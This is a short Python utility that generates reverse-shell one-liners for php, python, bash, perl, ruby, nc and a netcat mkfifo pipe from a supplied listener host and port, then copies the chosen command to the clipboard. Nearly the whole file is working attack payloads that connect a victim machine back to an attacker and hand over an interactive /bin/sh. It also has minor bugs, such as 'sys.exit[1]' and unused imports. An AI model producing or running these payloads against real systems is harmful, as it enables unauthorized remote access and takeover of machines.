#!/bin/python3
#Author: Chipyt
import pdb, signal, sys, os, pyperclip

def def_handler(sig, frame):
    print("\n\n[!] Exiting..\n")
    sys.exit[1]

# Ctrl C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 4:
    print("Use: python3 %s <shell language> <lhost> <lport>" % sys.argv[0])
    sys.exit(1)

# Global Variables
shell = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]

def revshell(shell):
    if shell == 'php':
        output = 'php -r \'$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");\'' % (lhost,  lport)

    elif shell == 'python':
        output = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'' % (lhost,  lport)

    elif shell == 'bash':
        output = 'bash -i >& /dev/tcp/%s/%s 0>&1' % (lhost,  lport)

    elif shell == 'perl':
        output = 'perl -e \'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'' % (lhost, lport)

    elif shell == 'ruby':
        output = "ruby -rsocket -e'spawn(\"bash\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%s))'" % (lhost, lport)

    elif shell == 'nc':
        output = 'nc -e /bin/sh %s %s' % (lhost, lport)

    elif shell == 'netcat':
        output = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f' % (lhost, lport)

    with open('output', 'w') as f:
        f.write(output)
        f.close()

    os.system("cat output | xclip -sel clip")
    os.remove("output")

if __name__ == '__main__':
    revshell(shell)
    
